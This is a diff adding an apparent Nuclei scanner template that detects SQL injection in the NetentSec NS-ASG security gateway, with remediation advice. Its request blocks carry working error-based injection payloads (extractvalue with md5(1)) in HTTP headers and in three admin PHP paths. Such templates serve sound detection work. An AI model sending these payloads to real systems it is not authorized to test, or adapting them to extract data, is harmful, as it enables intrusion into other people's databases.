@@ -1,0 +1,62 @@
+id: wooyun-2014-058987
+info:
+  name: NetentSec NS-ASG Application Security Gateway SQL Injection
+  author:
+  - 折跃
+  description: |-
+    The NetentSec NS-ASG application security gateway has an SQL injection vulnerability
+    The NetentSec NS-ASG application security gateway has a SQL vulnerability. An attacker can exploit it to obtain sensitive information.
+  reference:
+  - http://www.wooyun.org/bugs/wooyun-2014-058987
+  severity: high
+  remediation: |
+    Official fix:
+    1. It is recommended that users obtain the latest patch or latest version from the official website:
+
+    Temporary fix:
+    1. Use prepared statements. When using PDO, do not directly concatenate variables into PDO statements. Use the parameterized query interface provided by the database for all query statements; parameterized statements use parameters instead of embedding user-supplied variables into SQL statements. Almost all database systems currently provide a parameterized SQL execution interface, which can very effectively prevent SQL injection attacks.
+    2. Escape or encode special characters that enter the database, or convert their encoding.
+    3. Confirm the type of each data value; for example, numeric data must be numeric, and corresponding database storage fields must be of integer type.
+    4. Strictly limit data lengths, which to some extent prevents overly long SQL injection statements from executing correctly.
+    5. Unify the encoding of every data layer of the website; UTF-8 is recommended for all. Inconsistent encoding between layers may allow some filtering models to be bypassed.
+    6. Strictly limit the database operation privileges of website user accounts, granting only the minimum privileges needed for their work, thereby maximizing the reduction of harm caused by injection attacks to the database.
+    7. Avoid displaying SQL error messages on the website, such as type errors or field mismatches, to prevent attackers from using these error messages to make judgments.
+    8. Filter dangerous characters, for example: use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if any are matched.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'c4ca4238a0b923820dcc509a6f75849')
+  path:
+  - '{{BaseURL}}/3g/index.php'
+  - '{{BaseURL}}/include/authrp.php'
+  method: GET
+  headers:
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' OR (SELECT
+      2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,md5(1),0x7e,0x78))s), 8446744073709551610,
+      8446744073709551610))) AND 'a'='a
+    Cookie: reachstone_uid=1 and extractvalue(0x1,concat(0x23,md5(1)))
+    Host: '{{Hostname}}'
+    User-Agent: a'=extractvalue(0x1,concat(0x23,md5(1))),'','')#
+  req-condition: true
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'c4ca4238a0b923820dcc509a6f75849')
+  path:
+  - '{{BaseURL}}/{{varPath}}'
+  attack: batteringram
+  method: GET
+  payloads:
+    varPath:
+    - admin/config_MT.php?action=delete&Mid=1%20and%20extractvalue(0x1,concat(0x23,md5(1)))
+    - admin/count_user.php?action=GO&search=%27%0band%0bextractvalue(0x1,concat(0x23,md5(1)))%23
+    - admin/edit_fire_wall.php?action=update&FireWallId=111%20and%20extractvalue(0x1,concat(0x23,md5(1)))
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+  stop-at-first-match: true
